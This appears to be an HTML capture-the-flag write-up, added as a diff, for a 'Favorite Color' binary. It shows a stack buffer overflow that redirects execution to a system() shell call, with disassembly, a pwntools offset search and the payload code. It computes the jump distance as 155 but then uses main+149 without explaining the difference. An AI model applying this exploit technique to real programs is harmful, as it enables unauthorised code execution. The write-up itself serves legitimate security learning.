@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Favorite Color</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Favorite Color</h1>
+</header>
+<p><code>main</code> use return value from <code>vuln</code> to determine the final output. But return from <code>vuln</code> is not going to be <code>true</code> due to the logic below.</p>
+<pre><code>int good = 0;
+  for (int i = 0; buf[i]; i++) {
+  good &amp;= buf[i] ^ buf[i];
+}
+
+return good
+</code></pre>
+<p>We need <code>main</code> to go to the branch that call <code>system</code> to launch a shell. How about we just jmp to the critical block of code?</p>
+<pre><code>080485df &lt;main&gt;:
+ 80485df:       8d 4c 24 04             lea    0x4(%esp),%ecx
+ 80485e3:       83 e4 f0                and    $0xfffffff0,%esp
+ 80485e6:       ff 71 fc                pushl  -0x4(%ecx)
+ 80485e9:       55                      push   %ebp
+...
+
+ 8048674:       83 c4 10                add    $0x10,%esp
+ 8048677:       83 ec 0c                sub    $0xc,%esp
+ 804867a:       68 99 87 04 08          push   $0x8048799
+ 804867f:       e8 cc fd ff ff          call   8048450 &lt;system@plt&gt;</code></pre>
+<p>The <code>system</code> call starts at <em>0x804867a</em>, we can calculate the distance between <code>main</code> and the call, so the destination would be <code>main+149</code>.</p>
+<pre><code>distance = 0x804867a-0x80485df = 155</code></pre>
+<p>The padding can be found by <code>pwn.cyclic</code>, feed the program with <em>64</em> bytes of cyclic string.</p>
+<pre><code>&gt;&gt;&gt; pwn.cyclic(64)
+b&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa&#39;</code></pre>
+<p>Check segfault message in <code>dmesg</code>, notice the <code>6161616e</code> part? The padding is <code>52</code> in this case.</p>
+<pre><code>segfault at 6161616e ip 000000006161616e sp 00000000ffc07c30 error 14 in libc-2.27.so[f7d69000+1d2000]</code></pre>
+<pre><code>&gt;&gt;&gt; pwn.cyclic_find(0x6161616e)
+52</code></pre>
+<p>So the payload is <code>52 bytes of garbage + address of system call block</code>.</p>
+<pre><code>payload = b&#39;A&#39;*52
+payload += pwn.p32(elf.sym[&quot;main&quot;]+149)
+
+pr.sendline(&quot;cat flag.txt&quot;)
+print(pr.readall(2).decode())</code></pre>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
